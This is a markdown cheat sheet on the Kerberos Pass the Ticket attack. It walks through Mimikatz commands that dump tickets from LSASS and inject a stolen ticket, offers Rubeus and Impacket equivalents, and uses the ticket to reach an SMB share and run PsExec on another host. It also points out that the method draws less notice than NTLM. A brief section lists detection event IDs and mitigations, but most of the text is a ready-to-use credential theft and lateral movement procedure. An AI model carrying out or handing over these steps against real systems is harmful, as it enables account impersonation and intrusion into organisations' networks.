# **Pass the Ticket (PtT)**  
*Steal and reuse Kerberos TGS tickets for lateral movement.*  

---

#### **Conditions for Success**  
1. **Valid Kerberos TGS Ticket**:  
   - A **service ticket** (TGS) for the target service (e.g., `cifs/web04`) must exist in memory.  
2. **Access to LSASS**:  
   - Requires **local admin rights** to dump tickets from LSASS (if stealing from another user).  
3. **No Admin Needed for Injection**:  
   - Injecting tickets into your **own session** does **not** require admin privileges.  

---

### **Steps & Examples**  

#### **1. Dump Kerberos Tickets**  
*Use Mimikatz to export all tickets from memory:*  
```powershell
privilege::debug           # Elevate to DEBUG privileges
sekurlsa::tickets /export  # Export all TGT/TGS to .kirbi files
```  
**Output**: Tickets saved as `.kirbi` files (e.g., `[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`).  

---

#### **2. Inject the Ticket**  
*Load the stolen TGS into your session:*  
```powershell
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```  
**Result**: Ticket is cached in memory for the current session.  

---

#### **3. Verify Tickets**  
```powershell
klist  # List cached tickets
```  
**Expected Output**:  
```plaintext
#0> Client: dave @ CORP.COM  
    Server: cifs/web04 @ CORP.COM  
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96  
```  

---

#### **4. Access Restricted Resources**  
```powershell
ls \\web04\backup  # Access SMB share
# OR
.\PsExec.exe \\web04 cmd.exe  # Execute commands
```  

---

### **Tools & Commands**  
| **Tool**       | **Command**                                                                 |  
|-----------------|-----------------------------------------------------------------------------|  
| **Mimikatz**   | `sekurlsa::tickets /export` + `kerberos::ptt <TICKET.kirbi>`                |  
| **Rubeus**     | `Rubeus.exe asktgs /ticket:<BASE64_TICKET> /service:cifs/web04 /ptt`        |  
| **Impacket**   | `export KRB5CCNAME=<TICKET.ccache>` + use `-k` in tools (e.g., `smbexec.py`)|  

---

### **Key Notes**  
- **Why `whoami` Doesn’t Change**:  
  - `whoami` reflects the **process token** (original user), but Kerberos tickets are stored in the **logon session**.  
- **Stealth**:  
  - PtT uses **Kerberos**, which is less suspicious than NTLM.  
- **Ticket Lifespan**:  
  - Tickets expire (default: **10 hours**). Check `klist` for validity.  

---

### **Detection & Mitigation**  
**Detection**:  
- **Event ID 4769**: Kerberos service ticket requests from unexpected users.  
- **Event ID 4624**: Logon Type 3 (Network) with TGS usage.  

**Mitigation**:  
- Restrict **local admin privileges** to limit LSASS dumping.  
- Enforce **AES encryption** (disable RC4).  
- Monitor for `sekurlsa::tickets` (Mimikatz) or `asktgs` (Rubeus) activity.  

---

### **Example Workflow**  
1. **Dump tickets** from a compromised machine where `dave` is logged in.  
2. **Inject** `dave@cifs-web04.kirbi` into your session.  
3. Access `\\web04\backup` as `dave` without knowing their password!  

---

### **References**  
- [Mimikatz Guide](https://github.com/gentilkiwi/mimikatz/wiki)  
- [Rubeus Documentation](https://github.com/GhostPack/Rubeus)  
